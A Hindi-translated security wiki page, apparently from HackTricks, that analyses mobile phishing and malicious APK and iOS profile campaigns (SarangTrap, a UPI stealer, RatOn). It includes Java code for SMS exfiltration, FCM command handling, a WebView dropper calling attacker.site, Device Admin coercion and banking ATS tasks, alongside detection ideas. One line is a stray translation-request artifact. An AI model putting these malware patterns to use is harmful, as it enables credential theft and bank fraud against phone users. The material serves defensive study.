# मोबाइल फ़िशिंग और मैलिशियस ऐप वितरण (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पेज उन तकनीकों को कवर करता है जिन्हें threat actors द्वारा **malicious Android APKs** और **iOS mobile-configuration profiles** को phishing (SEO, social engineering, fake stores, dating apps, आदि) के माध्यम से वितरित करने के लिए इस्तेमाल किया जाता है।
> सामग्री SarangTrap campaign जिसे Zimperium zLabs (2025) ने उजागर किया और अन्य सार्वजनिक रिसर्च से अनुकूलित है।

## हमले का प्रवाह

1. **SEO/Phishing इन्फ्रास्ट्रक्चर**
* दर्जनों look-alike domains रजिस्टर करें (dating, cloud share, car service…).
– `<title>` एलिमेंट में स्थानीय भाषा के keywords और emojis का उपयोग करके Google में रैंक हासिल करें।
– एक ही landing page पर *both* Android (`.apk`) और iOS install निर्देश होस्ट करें.
2. **पहला स्टेज डाउनलोड**
* Android: सीधे लिंक जो एक *unsigned* या “third-party store” APK की ओर जाता है।
* iOS: `itms-services://` या साधारण HTTPS लिंक जो एक malicious **mobileconfig** profile पर पॉइंट करता है (नीचे देखें)।
3. **पोस्ट-इंस्टॉल Social Engineering**
* पहली बार चलाते समय ऐप एक **invitation / verification code** मांगता है (exclusive access का भान कराना)।
* कोड को HTTP पर POST किया जाता है Command-and-Control (C2) को।
* C2 उत्तर देता है `{"success":true}` ➜ malware जारी रहता है।
* Sandbox / AV dynamic analysis जो कभी वैध कोड सबमिट नहीं करता उस स्थिति में कोई malicious behaviour नहीं दिखता (evasion)।
4. **रनटाइम परमिशन दुरुपयोग (Android)**
* खतरनाक permissions केवल positive C2 response के बाद ही अनुरोध किए जाते हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* हालिया वेरिएंट `<uses-permission>` for SMS को `AndroidManifest.xml` से हटाते हैं लेकिन Java/Kotlin कोड पाथ को reflection के माध्यम से SMS पढ़ने के लिए छोड़ देते हैं ⇒ static स्कोर कम होता है जबकि उन डिवाइसेस पर अभी भी कार्यशील रहता है जो `AppOps` abuse या पुराने लक्ष्यों के कारण permission दे चुके हैं।
5. **Facade UI और बैकग्राउंड कलेक्शन**
* ऐप स्थानीय रूप से harmless views (SMS viewer, gallery picker) दिखाता है।
* इस दौरान यह एक्सफिल्ट्रेट करता है:
- IMEI / IMSI, फोन नंबर
- पूरा `ContactsContract` dump (JSON array)
- `/sdcard/DCIM` से JPEG/PNG जिन्हें आकार घटाने के लिए [Luban](https://github.com/Curzibn/Luban) से compress किया गया
- वैकल्पिक SMS कंटेंट (`content://sms`)
Payloads को **batch-zipped** करके `HTTP POST /upload.php` के माध्यम से भेजा जाता है।
6. **iOS डिलीवरी तकनीक**
* एक single **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि का अनुरोध कर सकती है ताकि डिवाइस को “MDM”-like supervision में enroll किया जा सके।
* Social-engineering निर्देश:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots phishing पेज पर)।
3. Trust the unsigned profile ➜ attacker को *Contacts* & *Photo* entitlement मिल जाता है बिना App Store review के।
7. **नेटवर्क लेयर**
* Plain HTTP, अक्सर port 80 पर HOST header जैसे `api.<phishingdomain>.com` का उपयोग।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (कोई TLS नहीं → पहचानना आसान)।

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – malware assessment के दौरान invitation code phase को Frida/Objection से automate करें ताकि malicious branch तक पहुँचा जा सके।
* **Manifest vs. Runtime Diff** – `aapt dump permissions` की तुलना runtime `PackageManager#getRequestedPermissions()` से करें; गुम खतरनाक perms एक रेड फ्लैग हैं।
* **Network Canary** – unsolid POST bursts को डिटेक्ट करने के लिए `iptables -p tcp --dport 80 -j NFQUEUE` कॉन्फ़िगर करें, खासकर कोड एंट्री के बाद।
* **mobileconfig Inspection** – macOS पर `security cms -D -i profile.mobileconfig` का उपयोग कर `PayloadContent` की सूची बनाकर अत्यधिक entitlements पकड़ें।

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** ताकि keyword-rich डोमेन के अचानक पैमाने को पकड़ा जा सके।
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` Dalvik clients से जो Google Play के बाहर हैं।
* **Invite-code Telemetry** – APK install के तुरंत बाद 6–8 अंकों वाले numeric codes का POST होना staging का संकेत दे सकता है।
* **MobileConfig Signing** – MDM नीति के जरिए unsigned configuration profiles को ब्लॉक करें।

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## संकेतक (सामान्य)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

यह पैटर्न उन अभियानों में देखा गया है जो सरकारी-लाभ थीमों का दुरुपयोग करके भारतीय UPI क्रेडेंशियल और OTP चुराते हैं। ऑपरेटर डिलीवरी और रिसिलिएंस के लिए प्रतिष्ठित प्लेटफॉर्मों को श्रृंखलाबद्ध करते हैं।

### Delivery chain across trusted platforms
- YouTube वीडियो lure → विवरण में एक शॉर्टलिंक
- Shortlink → GitHub Pages पर legit पोर्टल की नकल करने वाली phishing साइट
- वही GitHub repo एक APK होस्ट करता है जिस पर नकली “Google Play” बैज होता है जो सीधे फ़ाइल से लिंक करता है
- डायनामिक phishing पेज Replit पर लाइव होते हैं; रिमोट कमांड चैनल Firebase Cloud Messaging (FCM) का उपयोग करता है

### Dropper with embedded payload and offline install
- पहला APK एक इंस्टॉलर (dropper) है जो असली malware को `assets/app.apk` में शिप करता है और उपयोगकर्ता से Wi‑Fi/mobile data अक्षम करने को कहता है ताकि क्लाउड डिटेक्शन कमजोर किया जा सके।
- एंबेडेड payload एक सामान्य लेबल के तहत इंस्टॉल होता है (उदा., “Secure Update”)। इंस्टॉल के बाद, इंस्टॉलर और payload दोनों अलग-अलग ऐप्स के रूप में मौजूद रहते हैं।

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### शॉर्टलिंक के माध्यम से डायनेमिक एंडपॉइंट खोज
- Malware shortlink से सादा-टेक्स्ट, कॉमा-सेपरेटेड सूची में लाइव एंडपॉइंट्स को फ़ेच करता है; सरल string transforms अंतिम phishing पेज का path उत्पन्न करते हैं।

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
छद्म-कोड:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” चरण WebView के अंदर dynamic endpoint से attacker HTML form लोड करता है और संवेदनशील फ़ील्ड्स (phone, bank, UPI PIN) को कैप्चर करता है, जिन्हें `POST` किया जाता है `addup.php` पर।

न्यूनतम लोडर:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- पहली बार चलाने पर आक्रामक अनुमतियाँ मांगी जाती हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- संपर्कों को पीड़ित के डिवाइस से smishing SMS बड़े पैमाने पर भेजने के लिए लूप किया जाता है।
- Incoming SMS को एक broadcast receiver द्वारा intercept किया जाता है और metadata (sender, body, SIM slot, per-device random ID) के साथ `/addsm.php` पर अपलोड किया जाता है।

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) को एक लचीला C2 के रूप में
- payload FCM में रजिस्टर होता है; push messages में `_type` फ़ील्ड होती है जिसका उपयोग क्रियाओं को ट्रिगर करने के लिए switch की तरह किया जाता है (उदा., phishing टेक्स्ट टेम्पलेट अपडेट करना, व्यवहार टॉगल करना)।

FCM payload का उदाहरण:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler रूपरेखा:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### हंटिंग पैटर्न और IOCs
- APK में सेकेंडरी payload `assets/app.apk` में मौजूद
- WebView `gate.htm` से payment लोड करता है और `/addup.php` पर exfiltrates करता है
- SMS exfiltration `/addsm.php` पर
- Shortlink-driven config fetch (उदा., `rebrand.ly/*`) जो CSV endpoints लौटाता है
- Apps जो generic “Update/Secure Update” लेबल किए गए हों
- अनट्रस्टेड ऐप्स में FCM `data` messages जिनमें `_type` discriminator हो

### पहचान और रक्षा के विचार
- उन ऐप्स को फ़्लैग करें जो इंस्टॉल के दौरान उपयोगकर्ताओं को नेटवर्क disable करने का निर्देश देती हैं और फिर `assets/` से दूसरा APK side-load करती हैं।
- निम्न permission tuple पर अलर्ट: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-आधारित payment flows.
- non-corporate hosts पर `POST /addup.php|/addsm.php` के लिए egress मॉनिटरिंग; ज्ञात infrastructure को ब्लॉक करें।
- Mobile EDR rules: अनट्रस्टेड ऐप जो FCM के लिए register करता है और `_type` फील्ड पर branching करता है।

---

## Socket.IO/WebSocket-आधारित APK Smuggling + Fake Google Play Pages

हमलावर बढ़ती हुई प्रवृत्ति में स्थिर APK लिंक की जगह Socket.IO/WebSocket चैनल का उपयोग करते हैं जिसे Google Play–looking lures में एम्बेड किया जाता है। यह payload URL को छिपाता है, URL/extension फिल्टर को बायपास करता है, और वास्तविक दिखने वाला install UX बनाए रखता है।

Typical client flow observed in the wild:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Why it evades simple controls:
- कोई स्थिर APK URL उजागर नहीं होता; payload को WebSocket frames से मेमोरी में पुनर्निर्मित किया जाता है.
- URL/MIME/extension filters जो सीधे .apk responses को ब्लॉक करते हैं वे WebSockets/Socket.IO के माध्यम से टनल किए गए बाइनरी डेटा को मिस कर सकते हैं.
- WebSockets को execute न करने वाले Crawlers और URL sandboxes payload को retrieve नहीं कर पाएँगे.

Hunting and detection ideas:
- Web/network telemetry: उन WebSocket sessions को flag करें जो बड़े binary chunks transfer करते हैं और उसके बाद MIME application/vnd.android.package-archive वाला Blob बनाया जाता है और programmatic `<a download>` click किया जाता है। page scripts में socket.emit('startDownload') जैसे client strings और chunk, downloadProgress, downloadComplete नाम के events देखें।
- Play-store spoof heuristics: Play-जैसी pages सर्व करने वाले non-Google domains पर Google Play UI strings (जैसे http.html:"VfPpkd-jY41G-V67aGc"), mixed-language templates, और WS events से driven नकली “verification/progress” flows की तलाश करें।
- Controls: non-Google origins से APK delivery को ब्लॉक करें; WebSocket traffic को शामिल करने वाली MIME/extension नीतियाँ लागू करें; ब्राउज़र के safe-download prompts को बनाए रखें।

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

The RatOn banker/RAT campaign (ThreatFabric) एक ठोस उदाहरण है कि कैसे आधुनिक mobile phishing ऑपरेशन्स WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, और यहां तक कि NFC-relay orchestration को मिलाते हैं। यह सेक्शन पुन:उपयोग योग्य तकनीकों का सार प्रस्तुत करता है।

### Stage-1: WebView → native install bridge (dropper)
हमलावर एक attacker page की ओर संकेत करने वाला WebView प्रस्तुत करते हैं और एक JavaScript interface inject करते हैं जो native installer को एक्सपोज़ करता है। HTML button पर tap करने से native code कॉल होता है जो dropper के assets में bundled दूसरे-स्टेज APK को install करता है और फिर उसे सीधे launch कर देता है।

न्यूनतम पैटर्न:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
कृपया उस पृष्ठ का HTML यहाँ चिपकाएँ जिसे आप हिंदी में अनुवादित करवाना चाहते हैं।
```html
<button onclick="bridge.installApk()">Install</button>
```
इंस्टॉल करने के बाद, dropper explicit package/activity के माध्यम से payload शुरू करता है:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: अनविश्वसनीय ऐप्स `addJavascriptInterface()` कॉल कर रहे हैं और WebView को installer-जैसी विधियाँ एक्सपोज़ कर रहे हैं; APK एक embedded सेकेंडरी payload को `assets/` के अंतर्गत शिप कर रहा है और Package Installer Session API को इनवोक कर रहा है।

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 एक WebView खोलता है जो एक “Access” पेज होस्ट करता है। इसके बटन से एक exported method इनवोक होता है जो पीड़ित को Accessibility settings पर नेविगेट करता है और rogue service को सक्षम करने का अनुरोध करता है। एक बार अनुमति मिलने पर, malware Accessibility का उपयोग करके बाद के runtime permission dialogs (contacts, overlay, manage system settings, आदि) में auto-click कर के आगे बढ़ता है और Device Admin का अनुरोध करता है।

- Accessibility प्रोग्रामैटिकली बाद के प्रॉम्प्ट स्वीकार करने में मदद करता है — node-tree में “Allow”/“OK” जैसे बटनों को ढूंढकर और क्लिक dispatch करके।
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
देखें:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView के माध्यम से Overlay phishing/ransom
ऑपरेटर आदेश दे सकते हैं:
- URL से full-screen overlay प्रदर्शित करना, या
- inline HTML पास करना जिसे WebView overlay में लोड किया जाता है।

संभावित उपयोग: जबरदस्ती (PIN entry), वॉलेट खोलकर PIN कैप्चर करना, ransom संदेश भेजना। यदि अनुमति नहीं है तो overlay permission दिए जाने को सुनिश्चित करने के लिए एक command रखें।

### Remote control model – text pseudo-screen + screen-cast
- कम-बैंडविड्थ: नियमित अंतराल पर Accessibility node tree को dump करें, दृश्य texts/roles/bounds को serialize करें और pseudo-screen के रूप में C2 पर भेजें (commands like `txt_screen` एक बार और `screen_live` लगातार)।
- हाई-फिडेलिटी: MediaProjection का अनुरोध करें और मांग पर screen-casting/recording शुरू करें (commands like `display` / `record`)।

### ATS playbook (बैंक ऐप ऑटोमेशन)
एक JSON task दिए जाने पर, बैंक ऐप खोलें, Accessibility के माध्यम से UI को text queries और coordinate taps के मिश्रण से नियंत्रित करें, और जब पूछा जाए तो पीड़ित का payment PIN दर्ज करें।

उदाहरण task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
एक लक्षित फ़्लो में देखे गए उदाहरण टेक्स्ट (CZ → EN):
- "Nová platba" → "नया भुगतान"
- "Zadat platbu" → "भुगतान दर्ज करें"
- "Nový příjemce" → "नया प्राप्तकर्ता"
- "Domácí číslo účtu" → "घरेलू खाता संख्या"
- "Další" → "अगला"
- "Odeslat" → "भेजें"
- "Ano, pokračovat" → "हाँ, जारी रखें"
- "Zaplatit" → "भुगतान करें"
- "Hotovo" → "हो गया"

ऑपरेटर `check_limit` और `limit` जैसे कमांड्स के जरिए transfer limits की जाँच/बढ़ोतरी भी कर सकते हैं, जो limits UI के माध्यम से समान रूप से नेविगेट करते हैं।

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- तुरंत लॉक:
```java
dpm.lockNow();
```
- वर्तमान क्रेडेंशियल की वैधता समाप्त करें ताकि परिवर्तन अनिवार्य हो (Accessibility नए PIN/password को कैप्चर करता है):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard biometric features को अक्षम करके non-biometric unlock को मजबूर करें:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: कई DevicePolicyManager controls हाल के Android पर Device Owner/Profile Owner की आवश्यकता करते हैं; कुछ OEM builds ढीले हो सकते हैं। हमेशा target OS/OEM पर सत्यापित करें।

### NFC relay orchestration (NFSkate)
Stage-3 एक external NFC-relay module (उदा., NFSkate) install और launch कर सकता है और relay के दौरान पीड़ित का मार्गदर्शन करने के लिए इसे एक HTML template भी दे सकता है। यह online ATS के साथ-साथ contactless card-present cash-out सक्षम करता है।

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- ऐसे WebViews की तलाश करें जिनमें `addJavascriptInterface()` मौजूद हो जो installer/permission methods को एक्सपोज़ करता हो; ऐसे पेज जो “/access” पर खत्म होते हैं और Accessibility prompts को ट्रिगर करते हैं।
- उन ऐप्स पर अलर्ट करें जो service access मिलने के तुरंत बाद उच्च-दर की Accessibility gestures/clicks जनरेट करते हैं; ऐसी telemetry जो Accessibility node dumps जैसी दिखती है और C2 पर भेजी जाती है।
- untrusted apps में Device Admin नीति परिवर्तनों की निगरानी करें: `lockNow`, password expiration, keyguard feature toggles।
- non-corporate apps से आने वाले MediaProjection prompts पर अलर्ट करें, खासकर जब उसके बाद periodic frame uploads हों।
- किसी अन्य ऐप द्वारा trigger किए जाने पर external NFC-relay app के installation/launch का पता लगाएं।
- बैंकिंग के लिए: out-of-band confirmations, biometrics-binding, और ऐसे transaction-limits लागू करें जो on-device automation के प्रति प्रतिरोधी हों।

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
